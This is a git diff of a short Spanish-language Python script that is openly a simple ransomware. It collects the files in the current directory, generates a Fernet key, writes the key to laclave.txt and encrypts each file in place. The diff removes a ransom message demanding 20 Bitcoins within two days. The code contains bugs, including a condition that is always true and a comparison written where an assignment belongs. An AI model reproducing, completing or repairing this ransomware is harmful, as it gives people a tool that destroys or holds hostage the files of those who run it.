@@ -1,36 +1,31 @@
-#!tipo de lenguaje
 import os
+
+from cryptography.fernet import Fernet
 
 #encontrar archivos en el directorio actual
 
 archivos = []
 
 for archivo in os.listdir():
-        if archivo == "ransoMEL.py":
+        if archivo == "ransito.py" or "laclave.txt":
                 continue
-        if os.path isfile(archivo)
+        if os.path.isfile (archivo):
                 archivos.append(archivo)
-        
-print(archivos)
 
-#libreria para encriptar archivos con clave aleatoria
+print("archivos")
+
+#se guarda clave en un archivo
 
 clave = Fernet.generate_key()
 
 with open("laclave.txt", "wb") as laclave:
         laclave.write(clave)
-        
-#arriba se guarda clave en un archivo
 
-#bucle para encriptar archivos
+#encriptar archivos - bucle
 
-for archivo in archivos :
+for archivo in archivos:
         with open(archivo, "rb") as elarchivo:
                 contenidos == elarchivo.read()
         contenidos_encriptados = Fernet(clave).encrypt(contenidos)
         with open(archivo, "wb") as elarchivo:
                 elarchivo.write(contenidos_encriptados)
-
-#mensaje malvado
-
-print("Todos tus archivos han sido encriptados envia 20 Bitcoins o se eliminaran permanentemente en 2 dias")
